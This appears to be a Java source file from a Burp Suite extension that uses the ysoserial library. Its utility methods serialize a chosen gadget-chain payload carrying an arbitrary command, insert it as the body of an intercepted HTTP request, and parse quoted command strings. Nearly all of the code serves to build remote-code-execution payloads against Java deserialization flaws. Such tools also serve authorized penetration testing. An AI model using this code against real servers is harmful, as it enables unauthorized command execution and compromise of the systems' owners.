package burp;


import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Utilities {

    public static byte[] serializeRequest(byte[] message, String command, IExtensionHelpers helpers, String payloadType) {

        byte[] exploitArray = getExploitPayload(payloadType,command);

        IRequestInfo iRequestInfo = helpers.analyzeRequest(message);

        java.util.List<String> headers = iRequestInfo.getHeaders();

        return helpers.buildHttpMessage(headers, exploitArray);

    }

    private static byte[] getExploitPayload(String payloadType, String command){

        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType.split(" ")[0]);

        byte[] exploitPayload = new byte[0];

        try {
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(command);
            exploitPayload = Serializer.serialize(object);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
        }

        return exploitPayload;

    }

    public static String[] formatCommand(String command){
        List<String> list = new ArrayList<>();
        Matcher m = Pattern.compile("([^\']\\S*|\'.*?(.*).*?.+?\')\\s*").matcher(command);
        int first;
        int last;
        String firstFix;
        String lastFix;
        while (m.find()) {
            if(m.group(1).contains("\'")){
                first = m.group(1).indexOf('\'');
                firstFix = new StringBuilder(m.group(1)).replace(first,first+1,"").toString();
                last = firstFix.lastIndexOf('\'');
                lastFix = new StringBuilder(firstFix).replace(last,last+1,"").toString();
                list.add(lastFix);
            } else {
                list.add(m.group(1));
            }
        }

        return list.toArray(new String[list.size()]);
    }
}
